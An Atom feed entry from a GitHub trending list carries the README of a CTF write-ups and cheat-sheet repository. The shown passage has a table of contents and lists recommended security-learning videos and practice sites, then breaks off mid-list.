<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-02-06T01:30:56Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Adamkadaban/CTFs</title>
    <updated>2023-02-06T01:30:56Z</updated>
    <id>tag:github.com,2023-02-06:/Adamkadaban/CTFs</id>
    <link href="https://github.com/Adamkadaban/CTFs" rel="alternate"></link>
    <summary type="html">&lt;p&gt;CTF Cheat Sheet + Writeups / Files for some of the Cyber CTFs that I&#39;ve done&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;A Masters Guide to Learning Security&lt;/h1&gt; &#xA;&lt;p&gt;Writeups / Files for some of the Cyber CTFs that I&#39;ve done&lt;/p&gt; &#xA;&lt;p&gt;I&#39;ve also included a list of &lt;strong&gt;CTF resources&lt;/strong&gt; as well as a comprehensive &lt;strong&gt;cheat sheet&lt;/strong&gt; covering tons of common CTF challenges&lt;/p&gt; &#xA;&lt;h1&gt;Table of Contents&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#resources&#34;&gt;Resources&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#youtube-we-love-video-resources&#34;&gt;YouTube (We love video resources)&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#practice--learning-sites&#34;&gt;Practice / Learning Sites&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#ctfs&#34;&gt;CTFs&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#general&#34;&gt;General&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#pwn&#34;&gt;Pwn&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#rev&#34;&gt;Rev&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#web&#34;&gt;Web&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#crypto&#34;&gt;Crypto&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#smart-contracts&#34;&gt;Smart Contracts&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#pentesting&#34;&gt;Pentesting&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#ctf-cheat-sheet&#34;&gt;CTF Cheat Sheet&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#forensics--steganography&#34;&gt;Forensics / Steganography&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#general&#34;&gt;General&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#audio&#34;&gt;Audio&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#image&#34;&gt;Image&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#video&#34;&gt;Video&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#machine-image&#34;&gt;Machine Image&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#pcap&#34;&gt;Pcap&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#pwn--binary-exploitation&#34;&gt;Pwn / Binary Exploitation&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#general-1&#34;&gt;General&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#buffer-overflow&#34;&gt;Buffer overflow&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#pie-positional-independent-execution&#34;&gt;PIE (Positional Independent Execution)&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#nx-non-executable&#34;&gt;NX (Non-executable)&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#rop-for-statically-compiled-binaries&#34;&gt;ROP (for statically compiled binaries)&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#stack-canary&#34;&gt;Stack Canary&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#format-string-vulnerabilities&#34;&gt;Format String Vulnerabilities&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#shellcode&#34;&gt;Shellcode&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#return-to-libc&#34;&gt;Return-to-Libc&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#reverse-engineering&#34;&gt;Reverse Engineering&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#smt-solvers&#34;&gt;SMT Solvers&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#reversing-byte-by-byte-checks-side-channel-attack&#34;&gt;Reversing byte-by-byte checks&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#searching-strings-with-gef&#34;&gt;Searching strings with gef&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#web-1&#34;&gt;Web&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#fuzzing-input-fields&#34;&gt;Fuzzing input fields&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#crypto-1&#34;&gt;Crypto&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#cyberchef&#34;&gt;CyberChef&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;     &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#common-ciphers&#34;&gt;Common Ciphers&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;     &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#rsa&#34;&gt;RSA&lt;/a&gt;&lt;/p&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#grab-rsa-info-with-pycryptodome&#34;&gt;Grab RSA Info with pycryptodome&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#chinese-remainder-theorem-pqec&#34;&gt;Chinese Remainder Theorem (p,q,e,c)&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#coppersmith-attack-ce&#34;&gt;Coppersmith attack (c,e)&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#pollards-attack-nec&#34;&gt;Pollards attack (n,e,c)&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#wiener-attack-nec&#34;&gt;Wiener Attack (n,e,c)&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#base16-32-36-58-64-85-91-92&#34;&gt;Base16, 32, 36, 58, 64, 85, 91, 92&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#box&#34;&gt;Box&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#connecting&#34;&gt;Connecting&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#enumeration&#34;&gt;Enumeration&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#privilege-escalation&#34;&gt;Privilege escalation&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#listen-for-reverse-shell&#34;&gt;Listen for reverse shell&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#reverse-shell&#34;&gt;Reverse shell&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#get-interactive-shell&#34;&gt;Get interactive shell&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#linux&#34;&gt;Linux&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#windows--general&#34;&gt;Windows / General&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#osint&#34;&gt;OSINT&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/#misc&#34;&gt;Misc&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Resources&lt;/h1&gt; &#xA;&lt;h2&gt;YouTube (We love video resources)&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/user/RootOfTheNull&#34;&gt;John Hammond&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Used to make a lot of CTF videos, but has moved on to more malware rev stuff&lt;/li&gt; &#xA;   &lt;li&gt;Still a ton of useful videos. The CTF ones especially are amazing for teaching brand new baby cyber members how to do things. Highly highly recommend.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w&#34;&gt;Live Overflow&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Makes extremely interesting and in-depth videos about cyber.&lt;/li&gt; &#xA;   &lt;li&gt;Has an &lt;a href=&#34;https://www.youtube.com/watch?v=iyAyN3GFM7A&amp;amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;amp;ab_channel=LiveOverflow&#34;&gt;amazing pwn series&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA&#34;&gt;IppSec&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Best pwner on YouTube.&lt;/li&gt; &#xA;   &lt;li&gt;Makes writeups of every single HackTheBox machine &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Talks about diff ways to solve and why things work. Highly recommend&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/user/Computerphile&#34;&gt;Computerphile&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Same people as Numberphile, but cooler. Makes really beginner-level and intuitive videos about basic concepts.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCkRe0pvrQvhkhFSciV0l2MQ&#34;&gt;pwn.college&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Beautiful, amazing, wonderful ASU professor that has tons of videos on pwn&lt;/li&gt; &#xA;   &lt;li&gt;Guided course material: &lt;a href=&#34;https://pwn.college/&#34;&gt;https://pwn.college/&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Tons of practice problems: &lt;a href=&#34;https://dojo.pwn.college/&#34;&gt;https://dojo.pwn.college/&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A&#34;&gt;PwnFunction&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Very high-quality and easy-to-understand animated videos about diff topics&lt;/li&gt; &#xA;   &lt;li&gt;Topics are a bit advanced, but easily understandable&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/user/carlislemc/featured&#34;&gt;Martin Carlisle&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Princeton Grad - Cyber Professor - picoCTF problem writer - YouTuber - He&#39;s got it all!&lt;/li&gt; &#xA;   &lt;li&gt;Fr makes amazing writeup videos about the picoCTF challenges.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCC2OBhIt1sHE4odV05RYP1w&#34;&gt;Sam Bowne&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Absolutely amazing professor at the City College of San Francisco&lt;/li&gt; &#xA;   &lt;li&gt;Sponsor of one of the best CPTC teams in the country&lt;/li&gt; &#xA;   &lt;li&gt;Open sources all of his lectures and course material on &lt;a href=&#34;https://samsclass.info/&#34;&gt;his website&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCkRe0pvrQvhkhFSciV0l2MQ&#34;&gt;UFSIT&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;UF Cyber team (I&#39;m a bit biased, but def one of the better YouTube channels for this)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg&#34;&gt;Gynvael&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Polish guy that competes on an amazing international CTF team&lt;/li&gt; &#xA;   &lt;li&gt;Makes amazingly intuitive video writeups. Has done the entirety of picoCTF 2019 (that&#39;s a lot)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/c/stacksmashing/videos&#34;&gt;stacksmashing&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Amazing reverse engineering &amp;amp; hardware hacking videos&lt;/li&gt; &#xA;   &lt;li&gt;Has a really cool series of him reverse engineering WannaCry&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCsNzKjRToTA2G0lR8FiduWQ&#34;&gt;Ben Greenberg&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;GMU prof with a bunch of pwn and malware video tutorials&lt;/li&gt; &#xA;   &lt;li&gt;A bit out-of-date, but still good&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/channel/UCUcnLCrBVK9gS6ctEUVvkjA/featured&#34;&gt;InfoSecLab at Georgia Tech&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Good &amp;amp; advanced in-depth lectures on pwn&lt;/li&gt; &#xA;   &lt;li&gt;Requires some background knowledge&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/c/RPISEC_talks/videos&#34;&gt;RPISEC&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;RPI University team meetings&lt;/li&gt; &#xA;   &lt;li&gt;Very advanced and assumes a bit of cs background knowledge&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;I&#39;ve also made some playlists of diff topics&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/playlist?list=PLwP8RAsXLdE7rmCJsnhSigSdxsgIGFfvx&#34;&gt;Pwn&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/playlist?list=PLwP8RAsXLdE4luKhUCnMZbsWVB3nHtJgI&#34;&gt;Crypto&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/playlist?list=PLwP8RAsXLdE4tKItjvHIAyDxrVB9v20qP&#34;&gt;Web&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/playlist?list=PLwP8RAsXLdE77qStEZ6si0S8q1D8pdmmp&#34;&gt;Forensics&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/playlist?list=PLwP8RAsXLdE485giESRsEkAxnhMm8T3wo&#34;&gt;OSINT&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/playlist?list=PLmxT2pVYo5LB5EzTPZGfFN0c2GDiSXgQe&#34;&gt;x86 Assembly&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/playlist?list=PLwP8RAsXLdE5H265XMi4q_LhskD1zJGgK&#34;&gt;CSAW writeups&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Here are some slides I&#39;ve made with the help of tjcsc&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1pusn6q46emvX9CN0SQ6YLctO2xVR8_DHEAg50tJbkYc/edit#slide=id.g17686fdf7bd_0_295&#34;&gt;Pwn&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1EmvJPyqm8bpNGwn0SGYgN1rKov-89PajtwE_uZaLESY/edit#slide=id.g12e7ff9f522_0_198&#34;&gt;Crypto&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1znRapkr1VAUO7gYjuB8jnFsBNSo0Jo7jsGE-JH7nZ9w/edit#slide=id.g1670189b8d9_0_303&#34;&gt;Web&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.google.com/presentation/d/1tcYyUrDrRkK74lQI0weHbjp2nSQtsRQlOGYz57zWjI8/edit#slide=id.g15f164357e9_0_4&#34;&gt;Rev&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Practice / Learning Sites&lt;/h2&gt; &#xA;&lt;h3&gt;CTFs&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://play.picoctf.org/practice&#34;&gt;PicoCTF&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Tons of amazing practice challenges.&lt;/li&gt; &#xA;   &lt;li&gt;Definitely the gold standard for getting started&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ctf.hackucf.org/challenges&#34;&gt;UCF&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Good overall, but great pwn practice&lt;/li&gt; &#xA;   &lt;li&gt;I&#39;m currently working on putting writeups &lt;a href=&#34;https://github.com/Adamkadaban/CTFs/tree/master/1.CTFs/HackUCF&#34;&gt;here&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ctf.hacker101.com/ctf&#34;&gt;hacker101&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;CTF, but slightly more geared toward pentesting&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://365.csaw.io/&#34;&gt;CSAW&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Down 90% the time and usually none of the connections work&lt;/li&gt; &#xA;   &lt;li&gt;If it is up though, it has a lot of good introductory challenges&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ctf101.org/&#34;&gt;CTF101&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;One of the best intros to CTFs I&#39;ve seen (gj osiris)&lt;/li&gt; &#xA;   &lt;li&gt;Very succinct and beginner-friendly&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;General&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Adamkadaban/CTFs/master/hackthebox.com&#34;&gt;HackTheBox&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;The OG box site &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Boxes are curated to ensure quality&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;Now has some CTF-style problems&lt;/li&gt; &#xA;   &lt;li&gt;Now has courses to start learning&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tryhackme.com/hacktivities&#34;&gt;TryHackMe&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Slightly easier boxes than HackTheBox&lt;/li&gt; &#xA;   &lt;li&gt;Step-by-step challenges&lt;/li&gt; &#xA;   &lt;li&gt;Now has &#34;learning paths&#34; to guide you through topics&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.cyberseclabs.co.uk/&#34;&gt;CybersecLabs&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Great collection of boxes&lt;/li&gt; &#xA;   &lt;li&gt;Has some CTF stuff&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Has vulnerable virtual machines you have to deploy yourself&lt;/li&gt; &#xA;   &lt;li&gt;Lots of variety, but hard to find good ones imo&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Pwn&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://pwnable.kr/index.php&#34;&gt;pwnable.kr&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Challenges with good range of difficulty&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pwnable.tw/challenge/&#34;&gt;pwnable.tw&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Harder than pwnable.kr&lt;/li&gt; &#xA;   &lt;li&gt;Has writeups once you solve the chall&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pwnable.xyz/challenges/&#34;&gt;pwnable.xyz&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;More pwn challenges&lt;/li&gt; &#xA;   &lt;li&gt;Has writeups once you solve the chall&lt;/li&gt; &#xA;   &lt;li&gt;You can upload your own challenges once you solve all of them&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dojo.pwn.college&#34;&gt;pwn dojo&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Best collection of pwn challenges in my opinion&lt;/li&gt; &#xA;   &lt;li&gt;Backed up with slides teaching how to do it &amp;amp; has a discord if you need help&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://guyinatuxedo.github.io/&#34;&gt;nightmare&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Gold standard for pwning C binaries&lt;/li&gt; &#xA;   &lt;li&gt;Has a few mistakes/typos, but amazing overall&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve&#34;&gt;pwn notes&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Notes from some random person online&lt;/li&gt; &#xA;   &lt;li&gt;Very surface-level, but good intro to everything&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://security.cs.pub.ro/summer-school/wiki/start&#34;&gt;Security Summer School&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;University of Bucharest Security Course&lt;/li&gt; &#xA;   &lt;li&gt;Very beginner-friendly explanations&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/RPISEC/MBE&#34;&gt;RPISEC MBE&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;RPI&#39;s Modern Binary Exploitation Course&lt;/li&gt; &#xA;   &lt;li&gt;Has a good amount of 